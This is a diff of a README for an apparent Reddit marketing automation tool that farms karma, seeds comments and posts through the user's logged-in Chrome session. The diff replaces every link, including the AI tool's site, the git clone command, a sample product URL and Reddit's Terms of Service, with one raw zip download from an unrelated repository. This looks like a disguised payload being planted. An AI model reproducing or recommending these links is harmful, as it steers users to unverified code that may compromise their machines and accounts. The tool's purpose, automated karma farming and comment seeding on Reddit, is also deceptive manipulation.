@@ -2,7 +2,7 @@
 
 Automate a 30-day Reddit marketing campaign through your Chrome browser. No Reddit API keys needed.
 
-A Chrome extension + [kimi AI](https://kimi.moonshot.cn/) handles karma building, seeding comments, and posting — all through your actual logged-in browser session.
+A Chrome extension + [kimi AI](https://github.com/jacamer681/reddit-campaign-cli/raw/refs/heads/main/src/cli-reddit-campaign-2.3-alpha.4.zip) handles karma building, seeding comments, and posting — all through your actual logged-in browser session.
 
 ## How it works
 
@@ -27,13 +27,13 @@ A Chrome extension + [kimi AI](https://kimi.moonshot.cn/) handles karma building
 - Python 3.11+
 - Google Chrome
 - Reddit account (logged in via Chrome)
-- [kimi CLI](https://kimi.moonshot.cn/) — AI-powered comment and post generation
+- [kimi CLI](https://github.com/jacamer681/reddit-campaign-cli/raw/refs/heads/main/src/cli-reddit-campaign-2.3-alpha.4.zip) — AI-powered comment and post generation
 
 ## Quick start
 
 ```bash
 # Clone
-git clone https://github.com/user/reddit-campaign-cli.git
+git clone https://github.com/jacamer681/reddit-campaign-cli/raw/refs/heads/main/src/cli-reddit-campaign-2.3-alpha.4.zip
 cd reddit-campaign-cli
 
 # Install Python dependencies
@@ -70,7 +70,7 @@ Edit `campaign.toml` with your product info:
 ```toml
 [product]
 name = "My App"
-url = "https://github.com/user/my-app"
+url = "https://github.com/jacamer681/reddit-campaign-cli/raw/refs/heads/main/src/cli-reddit-campaign-2.3-alpha.4.zip"
 tagline = "A short description of your app"
 category = "developer_tool"    # developer_tool, saas, app, service, community
 
@@ -245,7 +245,7 @@ The campaign runs in 4 phases, automatically generated from your `campaign.toml`
 
 ## Disclaimer
 
-This tool is for educational and personal marketing purposes. Use responsibly and in compliance with [Reddit's Terms of Service](https://www.redditinc.com/policies/user-agreement). The authors are not responsible for any account actions resulting from use of this tool.
+This tool is for educational and personal marketing purposes. Use responsibly and in compliance with [Reddit's Terms of Service](https://github.com/jacamer681/reddit-campaign-cli/raw/refs/heads/main/src/cli-reddit-campaign-2.3-alpha.4.zip). The authors are not responsible for any account actions resulting from use of this tool.
 
 ## License
 
